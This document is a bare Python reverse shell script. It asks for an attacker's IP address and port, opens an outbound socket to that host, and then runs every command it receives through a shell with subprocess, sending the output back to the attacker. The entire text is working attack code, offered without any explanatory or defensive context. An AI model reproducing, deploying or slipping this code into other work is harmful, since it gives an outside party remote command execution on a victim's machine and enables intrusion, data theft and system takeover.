import socket
import subprocess

attacker_ip = input("Enter attacker's IP: ")
attacker_port = int(input("Enter attacker's port: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((attacker_ip, attacker_port))
except Exception as e:
    print(f"Connection failed: {e}")
    exit()

while True:
    try:
        
        command = s.recv(4096).decode('utf-8', errors='ignore')
        if not command:
            break  # Connection closed

        if command.lower() == "exit":
            break


        proc = subprocess.Popen(command, shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout_value, stderr_value = proc.communicate()
        result = stdout_value + stderr_value

        if not result:
            result = b"Command executed. No output returned.\n"

        s.sendall(result)

    except Exception as e:
        error_msg = f"Error: {str(e)}\n".encode()
        s.sendall(error_msg)

s.close()
